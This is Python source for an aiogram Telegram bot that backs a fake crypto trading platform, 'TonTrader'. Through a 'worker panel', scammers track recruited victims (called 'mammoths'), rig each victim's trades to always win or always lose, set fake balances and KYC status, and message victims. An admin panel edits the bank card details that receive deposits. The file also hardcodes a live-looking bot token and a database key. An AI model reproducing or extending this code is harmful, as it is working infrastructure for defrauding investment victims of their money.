import asyncio
import logging
import sys
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder
from supabase import create_client, Client

# ==========================================
# ⚙️ КОНФИГУРАЦИЯ
# ==========================================
# 🤖 TELEGRAM BOT
BOT_TOKEN = "7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0"
ADMIN_IDS = [844012884, 8162019020]  # Список администраторов

# 🔐 SUPABASE (ТЕ ЖЕ ДАННЫЕ, ЧТО И ДЛЯ REACT!)
# URL проекта (одинаковый для бота и сайта)
SUPABASE_URL = "https://wzpywfedbowlosmvecos.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind6cHl3ZmVkYm93bG9zbXZlY29zIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYzNTAyMzksImV4cCI6MjA4MTkyNjIzOX0.TmAYsmA8iwSpLPKOHIZM7jf3GLE3oeT7wD-l0ALwBPw"

# 🌐 WEBAPP
WEBAPP_URL = "https://tontrade-web-h31w.vercel.app/"
API_PORT = 8080

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

logging.basicConfig(level=logging.INFO, stream=sys.stdout)

# ==========================================
# 🧊 FSM STATES
# ==========================================
class WorkerStates(StatesGroup):
    changing_balance = State()
    sending_message = State()
    creating_promo_code = State()
    creating_promo_amount = State()
    creating_promo_activations = State()

class AdminStates(StatesGroup):
    changing_support = State()
    selecting_country = State()
    changing_country_bank = State()

# ==========================================
# 🗄 DATABASE FUNCTIONS
# ==========================================
def db_get_user(user_id):
    res = supabase.table("users").select("*").eq("user_id", user_id).execute()
    return res.data[0] if res.data else None

async def get_user_photo_url(user_id):
    """Получает URL фото профиля пользователя через Bot API"""
    try:
        photos = await bot.get_user_profile_photos(user_id, limit=1)
        if photos.total_count > 0:
            file = await bot.get_file(photos.photos[0][0].file_id)
            return f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file.file_path}"
    except Exception as e:
        logging.error(f"Error getting photo: {e}")
    return None

def db_upsert_user(user_id, username, full_name, referrer_id=None, photo_url=None):
    existing = db_get_user(user_id)
    
    user_data = {
        "user_id": user_id,
        "username": f"@{username}" if username else "No Username",
        "full_name": full_name
    }
    
    if photo_url:
        user_data["photo_url"] = photo_url
    
    if existing:
        supabase.table("users").update(user_data).eq("user_id", user_id).execute()
        return False
    else:
        user_data["referrer_id"] = referrer_id
        user_data["balance"] = 0
        user_data["luck"] = "default"
        user_data["is_kyc"] = False
        user_data["web_registered"] = False
        supabase.table("users").insert(user_data).execute()
        return True

def db_update_field(user_id, field, value):
    try:
        result = supabase.table("users").update({field: value}).eq("user_id", user_id).execute()
        logging.info(f"Updated user {user_id}: {field} = {value}")
        return result
    except Exception as e:
        logging.error(f"Error updating user {user_id} field {field}: {e}")
        return None

def db_get_mammoths(worker_id):
    res = supabase.table("users").select("*").eq("referrer_id", worker_id).execute()
    return res.data

def db_get_settings():
    try:
        res = supabase.table("settings").select("*").limit(1).execute()
        if res.data and len(res.data) > 0:
            logging.info(f"Settings loaded: {res.data[0]}")
            return res.data[0]
        else:
            logging.warning("No settings found in database")
            return {"support_username": "support", "min_deposit": 10.0}
    except Exception as e:
        logging.error(f"Error getting settings: {e}")
        return {"support_username": "support", "min_deposit": 10.0}

def db_get_country_bank_details():
    """Получает все реквизиты по странам"""
    try:
        res = supabase.table("country_bank_details").select("*").eq("is_active", True).order("country_name").execute()
        return res.data if res.data else []
    except Exception as e:
        logging.error(f"Error getting country bank details: {e}")
        return []

def db_get_country_by_name(country_name):
    """Получает реквизиты конкретной страны"""
    try:
        res = supabase.table("country_bank_details").select("*").eq("country_name", country_name).single().execute()
        return res.data if res.data else None
    except Exception as e:
        logging.error(f"Error getting country {country_name}: {e}")
        return None

def db_update_country_bank_details(country_name, bank_details):
    """Обновляет реквизиты для страны"""
    try:
        result = supabase.table("country_bank_details").update({
            "bank_details": bank_details
        }).eq("country_name", country_name).execute()
        logging.info(f"Updated bank details for {country_name}: {result}")
        return True
    except Exception as e:
        logging.error(f"Error updating bank details for {country_name}: {e}")
        return False

def db_create_promo_code(creator_id, code, reward_amount, max_activations, description=None):
    """Создает новый промокод"""
    try:
        promo_data = {
            "code": code.upper(),
            "creator_id": creator_id,
            "reward_amount": reward_amount,
            "max_activations": max_activations,
            "description": description or f"Промокод от воркера {creator_id}"
        }
        result = supabase.table("promo_codes").insert(promo_data).execute()
        return result.data[0] if result.data else None
    except Exception as e:
        logging.error(f"Error creating promo code: {e}")
        return None

def db_get_worker_promos(creator_id):
    """Получает все промокоды воркера"""
    try:
        res = supabase.table("promo_codes").select("*").eq("creator_id", creator_id).order("created_at", desc=True).execute()
        return res.data if res.data else []
    except Exception as e:
        logging.error(f"Error getting worker promos: {e}")
        return []

def db_check_promo_exists(code):
    """Проверяет, существует ли промокод"""
    try:
        res = supabase.table("promo_codes").select("id").eq("code", code.upper()).execute()
        return len(res.data) > 0
    except Exception as e:
        logging.error(f"Error checking promo exists: {e}")
        return True  # В случае ошибки считаем, что существует

# ==========================================
# 🎹 KEYBOARDS
# ==========================================
def kb_start(support_username, user_id):
    builder = InlineKeyboardBuilder()
    # Передаём user_id через URL для надёжной идентификации
    webapp_url_with_id = f"{WEBAPP_URL}?tgid={user_id}"
    builder.button(text="� Открытtь TonTrader", web_app=types.WebAppInfo(url=webapp_url_with_id))
    clean_support = support_username.replace("@", "")
    builder.button(text="💬 Support", url=f"https://t.me/{clean_support}")
    builder.adjust(1)
    return builder.as_markup()

def kb_worker():
    builder = InlineKeyboardBuilder()
    builder.button(text="🦣 Мои мамонты", callback_data="my_mammoths")
    builder.button(text="🎁 Создать промокод", callback_data="create_promo")
    builder.button(text="📋 Мои промокоды", callback_data="my_promos")
    builder.adjust(1)
    return builder.as_markup()

def kb_mammoth_control(user_id, luck, is_kyc):
    builder = InlineKeyboardBuilder()
    luck_map = {"win": "🟢 ВИН", "lose": "🔴 ЛУЗ", "default": "🎲 РАНДОМ"}
    builder.button(text=f"Удача: {luck_map.get(luck, '🎲')}", callback_data=f"menu_luck_{user_id}")
    builder.button(text="💰 Изменить баланс", callback_data=f"set_balance_{user_id}")
    kyc_text = "🛡 Убрать KYC" if is_kyc else "🛡 Дать KYC"
    builder.button(text=kyc_text, callback_data=f"toggle_kyc_{user_id}")
    builder.button(text="✉️ Написать", callback_data=f"send_msg_{user_id}")
    builder.button(text="🔙 Назад", callback_data="my_mammoths")
    builder.adjust(1)
    return builder.as_markup()

def kb_luck_select(user_id):
    builder = InlineKeyboardBuilder()
    builder.button(text="🟢 Всегда ВИН", callback_data=f"set_luck_{user_id}_win")
    builder.button(text="🔴 Всегда ЛУЗ", callback_data=f"set_luck_{user_id}_lose")
    builder.button(text="🎲 Рандом", callback_data=f"set_luck_{user_id}_default")
    builder.button(text="🔙 Назад", callback_data=f"open_mammoth_{user_id}")
    builder.adjust(1)
    return builder.as_markup()

def kb_admin():
    builder = InlineKeyboardBuilder()
    builder.button(text="✏️ Изменить Support", callback_data="adm_sup")
    builder.button(text="🏦 Реквизиты по странам", callback_data="adm_countries")
    builder.adjust(1)
    return builder.as_markup()

def kb_countries():
    """Клавиатура со списком стран"""
    builder = InlineKeyboardBuilder()
    countries = db_get_country_bank_details()
    
    for country in countries:
        builder.button(
            text=f"🏦 {country['country_name']} ({country['currency']})", 
            callback_data=f"country_{country['id']}"
        )
    
    builder.button(text="🔙 Назад", callback_data="back_admin")
    builder.adjust(1)
    return builder.as_markup()

# ==========================================
# 🚀 /start
# ==========================================
@dp.message(CommandStart())
async def cmd_start(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    username = message.from_user.username
    full_name = message.from_user.full_name
    
    # Получаем фото профиля
    photo_url = await get_user_photo_url(user_id)
    
    # Определяем реферера
    referrer_id = None
    if command.args and command.args.isdigit():
        possible_ref = int(command.args)
        if possible_ref != user_id and db_get_user(possible_ref):
            referrer_id = possible_ref

    # Регистрируем (с фото)
    is_new = db_upsert_user(user_id, username, full_name, referrer_id, photo_url)

    # Уведомляем воркера
    if is_new and referrer_id:
        try:
            notify_text = (
                "🦣 <b>НОВЫЙ МАМОНТ!</b>\n"
                f"👤 @{username or 'Нет ника'} ({user_id})\n"
                f"📱 {full_name}"
            )
            await bot.send_message(referrer_id, notify_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Notify error: {e}")
    settings = db_get_settings()
    welcome = (
        "🚀 <b>Добро пожаловать в TonTrader!</b>\n\n"
        "Современная трейдинговая платформа с удобной интеграцией в Telegram.\n"
        "Торгуй быстро, безопасно и без лишних шагов.\n\n"
        "👇 Нажми кнопку ниже, чтобы открыть биржу и начать"
    )
    
    # Отправляем фото с приветствием
    # Используем URL изображения вместо локального файла для надежности на хостинге
    photo_url = "https://i.imgur.com/your-image.jpg"  # Замените на ваш URL
    
    # Альтернативно можно использовать локальный файл:
    # from aiogram.types import FSInputFile
    # import os
    # photo_path = os.path.join(os.path.dirname(__file__), "welcome.jpg")
    
    try:
        # Используем локальный файл
        from aiogram.types import FSInputFile
        import os
        photo_path = os.path.join(os.path.dirname(__file__), "welcome.jpg")
        
        if os.path.exists(photo_path) and os.path.isfile(photo_path):
            photo = FSInputFile(photo_path)
            await message.answer_photo(photo, caption=welcome, parse_mode="HTML", reply_markup=kb_start(settings.get('support_username', 'support'), user_id))
        else:
            logging.warning(f"Photo file not found: {photo_path}")
            await message.answer(welcome, parse_mode="HTML", reply_markup=kb_start(settings.get('support_username', 'support'), user_id))
        
    except Exception as e:
        logging.error(f"Error sending photo: {e}")
        # Если фото не отправилось, отправляем текст без фото
        await message.answer(welcome, parse_mode="HTML", reply_markup=kb_start(settings.get('support_username', 'support'), user_id))

# ==========================================
# ⚡️ /worker
# ==========================================
@dp.message(Command("worker"))
async def cmd_worker(message: types.Message):
    user_id = message.from_user.id
    mammoths = db_get_mammoths(user_id)
    count = len(mammoths) if mammoths else 0
    
    # Получаем количество промокодов
    promos = db_get_worker_promos(user_id)
    promo_count = len(promos) if promos else 0
    
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
    
    text = (
        "⚡️ <b>WORKER PANEL</b>\n\n"
        f"👤 ID: <code>{user_id}</code>\n"
        f"🦣 Мамонтов: {count}\n"
        f"🎁 Промокодов: {promo_count}\n\n"
        f"🔗 Реф-ссылка:\n<code>{ref_link}</code>"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=kb_worker())

@dp.callback_query(F.data == "my_mammoths")
async def show_mammoths(call: types.CallbackQuery):
    mammoths = db_get_mammoths(call.from_user.id)
    
    builder = InlineKeyboardBuilder()
    if mammoths:
        for m in mammoths:
            label = f"{m.get('full_name', 'User')} | {m.get('balance', 0)}$"
            builder.button(text=label, callback_data=f"open_mammoth_{m['user_id']}")
    else:
        builder.button(text="Пока нет мамонтов", callback_data="ignore")
    builder.button(text="🔙 Назад", callback_data="back_worker")
    builder.adjust(1)
    
    await call.message.edit_text("🦣 <b>Ваши мамонты:</b>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "back_worker")
async def back_worker(call: types.CallbackQuery):
    user_id = call.from_user.id
    mammoths = db_get_mammoths(user_id)
    count = len(mammoths) if mammoths else 0
    
    # Получаем количество промокодов
    promos = db_get_worker_promos(user_id)
    promo_count = len(promos) if promos else 0
    
    bot_info = await bot.get_me()
    ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
    
    text = (
        "⚡️ <b>WORKER PANEL</b>\n\n"
        f"👤 ID: <code>{user_id}</code>\n"
        f"🦣 Мамонтов: {count}\n"
        f"🎁 Промокодов: {promo_count}\n\n"
        f"🔗 Реф-ссылка:\n<code>{ref_link}</code>"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_worker())

@dp.callback_query(F.data.startswith("open_mammoth_"))
async def open_mammoth(call: types.CallbackQuery):
    target_id = int(call.data.split("_")[2])
    m = db_get_user(target_id)
    
    if not m:
        await call.answer("Мамонт не найден", show_alert=True)
        return
    
    text = (
        "🦣 <b>ПРОФИЛЬ МАМОНТА</b>\n"
        "➖➖➖➖➖➖➖\n"
        f"👤 {m.get('username', 'Нет')} ({m['user_id']})\n"
        f"📱 {m.get('full_name', '-')}\n"
        f"💰 Баланс: <b>{m.get('balance', 0)} USD</b>\n"
        f"🍀 Удача: <b>{m.get('luck', 'default').upper()}</b>\n"
        f"🛡 KYC: {'✅' if m.get('is_kyc') else '❌'}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_mammoth_control(target_id, m.get('luck'), m.get('is_kyc')))

# === LUCK ===
@dp.callback_query(F.data.startswith("menu_luck_"))
async def menu_luck(call: types.CallbackQuery):
    target_id = int(call.data.split("_")[2])
    await call.message.edit_text("🍀 Выберите удачу:", reply_markup=kb_luck_select(target_id))

@dp.callback_query(F.data.startswith("set_luck_"))
async def set_luck(call: types.CallbackQuery):
    parts = call.data.split("_")
    target_id = int(parts[2])
    mode = parts[3]
    db_update_field(target_id, "luck", mode)
    await call.answer(f"Удача: {mode.upper()}")
    
    # Возврат в профиль
    m = db_get_user(target_id)
    text = (
        "🦣 <b>ПРОФИЛЬ МАМОНТА</b>\n"
        "➖➖➖➖➖➖➖\n"
        f"👤 {m.get('username', 'Нет')} ({m['user_id']})\n"
        f"📱 {m.get('full_name', '-')}\n"
        f"💰 Баланс: <b>{m.get('balance', 0)} USD</b>\n"
        f"🍀 Удача: <b>{m.get('luck', 'default').upper()}</b>\n"
        f"🛡 KYC: {'✅' if m.get('is_kyc') else '❌'}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_mammoth_control(target_id, m.get('luck'), m.get('is_kyc')))

# === KYC ===
@dp.callback_query(F.data.startswith("toggle_kyc_"))
async def toggle_kyc(call: types.CallbackQuery):
    target_id = int(call.data.split("_")[2])
    user = db_get_user(target_id)
    new_status = not user.get('is_kyc')
    db_update_field(target_id, "is_kyc", new_status)
    await call.answer("KYC изменен!")
    
    m = db_get_user(target_id)
    text = (
        "🦣 <b>ПРОФИЛЬ МАМОНТА</b>\n"
        "➖➖➖➖➖➖➖\n"
        f"👤 {m.get('username', 'Нет')} ({m['user_id']})\n"
        f"📱 {m.get('full_name', '-')}\n"
        f"💰 Баланс: <b>{m.get('balance', 0)} USD</b>\n"
        f"🍀 Удача: <b>{m.get('luck', 'default').upper()}</b>\n"
        f"🛡 KYC Верефикация: {'✅' if m.get('is_kyc') else '❌'}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_mammoth_control(target_id, m.get('luck'), m.get('is_kyc')))

# === BALANCE ===
@dp.callback_query(F.data.startswith("set_balance_"))
async def ask_balance(call: types.CallbackQuery, state: FSMContext):
    target_id = int(call.data.split("_")[2])
    await state.update_data(target_id=target_id)
    await state.set_state(WorkerStates.changing_balance)
    await call.message.edit_text("💰 Введите новый баланс:")

@dp.message(WorkerStates.changing_balance)
async def set_balance(message: types.Message, state: FSMContext):
    try:
        new_balance = float(message.text)
        data = await state.get_data()
        target_id = data['target_id']
        db_update_field(target_id, "balance", new_balance)
        await message.answer(f"✅ Баланс изменен на {new_balance}")
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите число!")

# === SEND MESSAGE ===
@dp.callback_query(F.data.startswith("send_msg_"))
async def ask_msg(call: types.CallbackQuery, state: FSMContext):
    target_id = int(call.data.split("_")[2])
    await state.update_data(target_id=target_id)
    await state.set_state(WorkerStates.sending_message)
    await call.message.edit_text("✉️ Введите сообщение:")

@dp.message(WorkerStates.sending_message)
async def send_msg(message: types.Message, state: FSMContext):
    data = await state.get_data()
    target_id = data['target_id']
    try:
        await bot.send_message(target_id, f"🔔 <b>Уведомление</b>\n\n{message.text}", parse_mode="HTML")
        await message.answer("✅ Отправлено!")
    except:
        await message.answer("❌ Ошибка отправки")
    await state.clear()

# ==========================================
# 🎁 ПРОМОКОДЫ
# ==========================================
@dp.callback_query(F.data == "create_promo")
async def create_promo_start(call: types.CallbackQuery, state: FSMContext):
    await state.set_state(WorkerStates.creating_promo_code)
    await call.message.edit_text(
        "🎁 <b>СОЗДАНИЕ ПРОМОКОДА</b>\n\n"
        "Введите текст промокода (только английские буквы и цифры):",
        parse_mode="HTML"
    )

@dp.message(WorkerStates.creating_promo_code)
async def create_promo_code(message: types.Message, state: FSMContext):
    code = message.text.strip().upper()
    
    # Проверяем формат кода
    if not code.replace('_', '').replace('-', '').isalnum():
        await message.answer("❌ Промокод может содержать только буквы, цифры, дефисы и подчеркивания!")
        return
    
    if len(code) < 3 or len(code) > 20:
        await message.answer("❌ Длина промокода должна быть от 3 до 20 символов!")
        return
    
    # Проверяем, не существует ли уже такой промокод
    if db_check_promo_exists(code):
        await message.answer("❌ Промокод с таким названием уже существует! Попробуйте другой.")
        return
    
    await state.update_data(promo_code=code)
    await state.set_state(WorkerStates.creating_promo_amount)
    await message.answer(
        f"✅ Промокод: <b>{code}</b>\n\n"
        f"💰 Теперь введите сумму бонуса в USD (например: 50):",
        parse_mode="HTML"
    )

@dp.message(WorkerStates.creating_promo_amount)
async def create_promo_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount <= 0 or amount > 1000:
            await message.answer("❌ Сумма должна быть от 0.01 до 1000 USD!")
            return
        
        await state.update_data(promo_amount=amount)
        await state.set_state(WorkerStates.creating_promo_activations)
        await message.answer(
            f"💰 Сумма бонуса: <b>${amount:.2f}</b>\n\n"
            f"🔢 Введите максимальное количество активаций (1-10000):",
            parse_mode="HTML"
        )
    except ValueError:
        await message.answer("❌ Введите корректную сумму (например: 50 или 25.5)!")

@dp.message(WorkerStates.creating_promo_activations)
async def create_promo_activations(message: types.Message, state: FSMContext):
    try:
        activations = int(message.text)
        if activations <= 0 or activations > 10000:
            await message.answer("❌ Количество активаций должно быть от 1 до 10000!")
            return
        
        data = await state.get_data()
        code = data['promo_code']
        amount = data['promo_amount']
        creator_id = message.from_user.id
        
        # Создаем промокод в базе
        promo = db_create_promo_code(creator_id, code, amount, activations)
        
        if promo:
            await message.answer(
                f"🎉 <b>ПРОМОКОД СОЗДАН!</b>\n\n"
                f"🎁 Код: <code>{code}</code>\n"
                f"💰 Бонус: <b>${amount:.2f}</b>\n"
                f"🔢 Макс. активаций: <b>{activations}</b>\n"
                f"📅 Создан: {promo.get('created_at', 'сейчас')}\n\n"
                f"Промокод готов к использованию на сайте!",
                parse_mode="HTML"
            )
        else:
            await message.answer("❌ Ошибка создания промокода. Попробуйте еще раз.")
        
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите корректное число!")

@dp.callback_query(F.data == "my_promos")
async def show_my_promos(call: types.CallbackQuery):
    creator_id = call.from_user.id
    promos = db_get_worker_promos(creator_id)
    
    if not promos:
        builder = InlineKeyboardBuilder()
        builder.button(text="🎁 Создать первый промокод", callback_data="create_promo")
        builder.button(text="🔙 Назад", callback_data="back_worker")
        builder.adjust(1)
        
        await call.message.edit_text(
            "📋 <b>МОИ ПРОМОКОДЫ</b>\n\n"
            "У вас пока нет созданных промокодов.",
            parse_mode="HTML",
            reply_markup=builder.as_markup()
        )
        return
    
    # Формируем список промокодов
    text = "📋 <b>МОИ ПРОМОКОДЫ</b>\n\n"
    
    for promo in promos[:10]:  # Показываем только первые 10
        status = "🟢" if promo.get('is_active') else "🔴"
        activations = promo.get('current_activations', 0)
        max_activations = promo.get('max_activations', 0)
        
        text += (
            f"{status} <code>{promo['code']}</code>\n"
            f"💰 ${promo['reward_amount']:.2f} | "
            f"📊 {activations}/{max_activations}\n\n"
        )
    
    if len(promos) > 10:
        text += f"... и еще {len(promos) - 10} промокодов\n\n"
    
    builder = InlineKeyboardBuilder()
    builder.button(text="🎁 Создать новый", callback_data="create_promo")
    builder.button(text="🔙 Назад", callback_data="back_worker")
    builder.adjust(1)
    
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())

# ==========================================
# 👑 /admin
# ==========================================
@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    logging.info(f"/admin from {message.from_user.id}, ADMIN_IDS={ADMIN_IDS}")
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("❌ Нет доступа")
        return
    
    settings = db_get_settings()
    countries = db_get_country_bank_details()
    
    text = (
        "👑 <b>ADMIN PANEL</b>\n\n"
        f"📞 Support: @{settings.get('support_username')}\n"
        f"🏦 Стран с реквизитами: {len(countries)}\n"
        f"💰 Минимальный депозит: ${settings.get('min_deposit')}"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=kb_admin())

@dp.callback_query(F.data == "adm_sup")
async def adm_sup(call: types.CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.changing_support)
    await call.message.edit_text("Введите @username саппорта:")

@dp.message(AdminStates.changing_support)
async def save_sup(message: types.Message, state: FSMContext):
    success = db_update_settings("support_username", message.text)
    if success:
        await message.answer(f"✅ Support обновлен на: {message.text}")
    else:
        await message.answer("❌ Ошибка обновления. Проверьте логи.")
    await state.clear()

@dp.callback_query(F.data == "adm_countries")
async def adm_countries(call: types.CallbackQuery):
    """Показать список стран для редактирования реквизитов"""
    countries = db_get_country_bank_details()
    
    if not countries:
        await call.message.edit_text("❌ Страны не найдены. Проверьте базу данных.")
        return
    
    text = "🏦 <b>РЕКВИЗИТЫ ПО СТРАНАМ</b>\n\nВыберите страну для редактирования:"
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_countries())

@dp.callback_query(F.data.startswith("country_"))
async def show_country_details(call: types.CallbackQuery, state: FSMContext):
    """Показать детали страны и предложить редактирование"""
    country_id = int(call.data.split("_")[1])
    
    try:
        res = supabase.table("country_bank_details").select("*").eq("id", country_id).single().execute()
        country = res.data
        
        if not country:
            await call.answer("❌ Страна не найдена", show_alert=True)
            return
        
        text = (
            f"🏦 <b>{country['country_name']}</b>\n\n"
            f"💱 Валюта: <b>{country['currency']}</b>\n"
            f"📊 Курс к USD: <b>{country['exchange_rate']}</b>\n\n"
            f"💳 <b>Текущие реквизиты:</b>\n"
            f"<code>{country['bank_details']}</code>\n\n"
            f"📅 Обновлено: {country.get('updated_at', 'Неизвестно')}"
        )
        
        builder = InlineKeyboardBuilder()
        builder.button(text="✏️ Изменить реквизиты", callback_data=f"edit_country_{country_id}")
        builder.button(text="🔙 Назад к списку", callback_data="adm_countries")
        builder.adjust(1)
        
        await call.message.edit_text(text, parse_mode="HTML", reply_markup=builder.as_markup())
        
    except Exception as e:
        logging.error(f"Error showing country details: {e}")
        await call.answer("❌ Ошибка получения данных", show_alert=True)

@dp.callback_query(F.data.startswith("edit_country_"))
async def edit_country_bank(call: types.CallbackQuery, state: FSMContext):
    """Начать редактирование реквизитов страны"""
    country_id = int(call.data.split("_")[2])
    
    try:
        res = supabase.table("country_bank_details").select("*").eq("id", country_id).single().execute()
        country = res.data
        
        if not country:
            await call.answer("❌ Страна не найдена", show_alert=True)
            return
        
        await state.update_data(country_id=country_id, country_name=country['country_name'])
        await state.set_state(AdminStates.changing_country_bank)
        
        await call.message.edit_text(
            f"✏️ <b>Редактирование реквизитов для {country['country_name']}</b>\n\n"
            f"💳 <b>Текущие реквизиты:</b>\n<code>{country['bank_details']}</code>\n\n"
            f"📝 <b>Формат реквизитов:</b>\n"
            f"• Название банка\n"
            f"• Номер карты/счета\n"
            f"• Имя получателя\n"
            f"• Дополнительная информация (если нужно)\n\n"
            f"💡 <b>Пример:</b>\n"
            f"<code>Сбербанк\n"
            f"2202 2063 1234 5678\n"
            f"Иван Иванов\n"
            f"Переводы принимаются 24/7</code>\n\n"
            f"✍️ Введите новые реквизиты:",
            parse_mode="HTML"
        )
        
    except Exception as e:
        logging.error(f"Error starting country edit: {e}")
        await call.answer("❌ Ошибка", show_alert=True)

@dp.message(AdminStates.changing_country_bank)
async def save_country_bank(message: types.Message, state: FSMContext):
    """Сохранить новые реквизиты для страны"""
    data = await state.get_data()
    country_id = data.get('country_id')
    country_name = data.get('country_name')
    
    # Проверяем длину реквизитов
    if len(message.text.strip()) < 10:
        await message.answer(
            "❌ <b>Реквизиты слишком короткие!</b>\n\n"
            "Минимальная длина: 10 символов\n"
            "Попробуйте еще раз с полными данными.",
            parse_mode="HTML"
        )
        return
    
    try:
        logging.info(f"Updating bank details for country {country_name} (ID: {country_id})")
        
        result = supabase.table("country_bank_details").update({
            "bank_details": message.text.strip()
        }).eq("id", country_id).execute()
        
        logging.info(f"Update result: {result}")
        
        if result.data and len(result.data) > 0:
            await message.answer(
                f"✅ <b>Реквизиты успешно сохранены!</b>\n\n"
                f"🏦 Страна: <b>{country_name}</b>\n"
                f"💳 Новые реквизиты:\n<code>{message.text.strip()}</code>\n\n"
                f"📅 Время обновления: {datetime.now().strftime('%d.%m.%Y %H:%M')}",
                parse_mode="HTML"
            )
        else:
            await message.answer(
                f"❌ <b>Ошибка сохранения!</b>\n\n"
                f"Реквизиты для {country_name} не были обновлены.\n"
                f"Проверьте подключение к базе данных.",
                parse_mode="HTML"
            )
            
    except Exception as e:
        logging.error(f"Error saving country bank details: {e}")
        await message.answer(
            f"❌ <b>Критическая ошибка!</b>\n\n"
            f"Не удалось сохранить реквизиты для {country_name}\n"
            f"Ошибка: <code>{str(e)}</code>\n\n"
            f"Обратитесь к разработчику.",
            parse_mode="HTML"
        )
    
    await state.clear()

def db_update_settings(field, value):
    try:
        current = db_get_settings()
        if current.get('id'):
            logging.info(f"Updating settings: {field} = {value}")
            result = supabase.table("settings").update({field: value}).eq("id", current['id']).execute()
            logging.info(f"Settings update result: {result}")
            return True
        else:
            logging.error("No settings ID found, cannot update")
            return False
    except Exception as e:
        logging.error(f"Error updating settings: {e}")
        return False

@dp.callback_query(F.data == "back_admin")
async def back_admin(call: types.CallbackQuery):
    """Вернуться в главное админ меню"""
    settings = db_get_settings()
    countries = db_get_country_bank_details()
    
    text = (
        "👑 <b>ADMIN PANEL</b>\n\n"
        f"📞 Support: @{settings.get('support_username')}\n"
        f"🏦 Стран с реквизитами: {len(countries)}\n"
        f"💰 Минимальный депозит: ${settings.get('min_deposit')}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=kb_admin())

@dp.callback_query(F.data == "ignore")
async def ignore(call: types.CallbackQuery):
    await call.answer()

async def main():
    # Запускаем бота
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
